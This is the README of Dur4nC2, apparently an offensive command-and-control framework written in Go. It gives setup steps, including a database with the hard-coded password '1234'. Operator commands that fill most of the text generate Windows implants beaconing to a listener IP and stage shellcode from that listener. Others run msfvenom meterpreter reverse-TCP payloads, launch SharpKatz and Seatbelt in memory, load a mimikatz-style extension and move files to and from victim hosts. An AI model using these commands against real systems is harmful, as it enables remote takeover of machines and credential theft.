# Dur4nC2

## Setup
- Install Golang (minimum version 1.20.4): [Golang Installation](https://go.dev/doc/install)
- Download dependencies (if not done manually, they will be downloaded automatically during compilation; if using a compiled binary, dependencies are statically linked): `go get`
  - Configure the database
    - Docker: `sudo docker run --name dur4nc2DB -p 5432:5432 -e POSTGRES_PASSWORD=1234 -e POSTGRES_DB=c2 -e -d postgres`
    - Manual
        - Install PostgreSQL: [Download](https://www.postgresql.org/download/)
        - Configure the username as "postgres" (default), configure the password as "1234," and create the "c2" DB. Using pgAdmin 4 may help.
    - Database credentials are in Dur4nC2/server/db/postgresql.go 
- For Linux users,
  - `sudo apt install -y build-essential manpages-dev mingw-w64 mingw-w32 gcc-mingw-w64-x86-64 upx`
  - `cd; mkdir repos; cd repos; git clone https://github.com/TheWover/donut.git; cd donut; make`
- Run the server: `cd Dur4nC2/server && go run ./server.go`

## Commands
### Generators and Listeners
- Generate a new HTTP implant using the Dur4nC2 implant package template: `beacon -i /home/dur4n/repos/Dur4nC2/implant/ -b http://192.168.114.147:8000 -o windows`
- Start an HTTP listener: `http -d 192.168.114.147 -L 192.168.114.147 -l 8000`
- Generate a new HTTP implant and an HTTP listener. Generate the shellcode of the implant and host it from the listener: `staged-http -i /home/dur4n/repos/Dur4nC2/implant/ -b http://192.168.114.147:8000 -o windows -d 192.168.114.147  -L 192.168.114.147 -l 8000`

### Exec
```
execute-shellcode -f "D:\Malware\msfvenom_reversetcp_4444.txt"
execute-shellcode -f "/tmp/msfvenom_meterpreter_reversetcp_4444.txt"
execute-shellcode -f /home/dur4n/repos/Dur4nTools/shellcode/dummyApp_donut.bin -m sacrificial -i 12300
execute-assembly -f "D:\Malware\binaries\Seatbelt.exe" -a
execute-assembly -f "/home/dur4n/repos/Dur4nTools/assemblies/Seatbelt.exe" "" "-group=user"
execute-assembly -f "/home/dur4n/repos/Dur4nTools/assemblies/Seatbelt.exe" -m donut
execute-assembly -m donut -b 7060 -f /home/dur4n/repos/Dur4nTools/assemblies/DummyApp.exe
execute-assembly -f "/home/dur4n/repos/binaries/SharpKatz.exe" -a
```

### Extensions
```
extensions install "C:\Users\Jorge\GolandProjects\Dur4nC2\extensions\mimi.json"
extensions register mimi
extensions call mimi
extensions install /home/dur4n/repos/Dur4nC2/extensions/coffLoader.json
extensions install /home/dur4n/repos/Dur4nC2/extensions/arp.json
extensions install "C:\Users\Jorge\GolandProjects\Dur4nC2\extensions\coffLoader.json"
extensions install "C:\Users\Jorge\GolandProjects\Dur4nC2\extensions\dir.json"
```

### Utils
```
download -l /tmp/example.txt -r "C:\Temp\example.txt"
upload -l /tmp/example.txt -r "C:\Temp\example.txt"
```

## Notes
- Although Golang allows cross-platform compilation, some important functionalities have only been implemented for `windows` systems.
- To generate the implant, specify the absolute path where the package with the implant source code is located (Dur4nC2/implant/). Due to the special character `\` used to indicate the path, it needs to be escaped. Example: `beacon -i "C:\\App\\Dur4nC2\\implant\\"`
- Module `execute-assembly`: arguments can be passed to the assembly `execute-assembly -f "D:\\Tools\\Seatbelt.exe" -e -a "" -group=system`. There is a bug since the library used to parse arguments uses the character `-` for flags; if we use a flag for our assembly, Grumble will detect it as an argument for the CLI. We need to specify some command, an empty string, etc., to separate this interpretation.
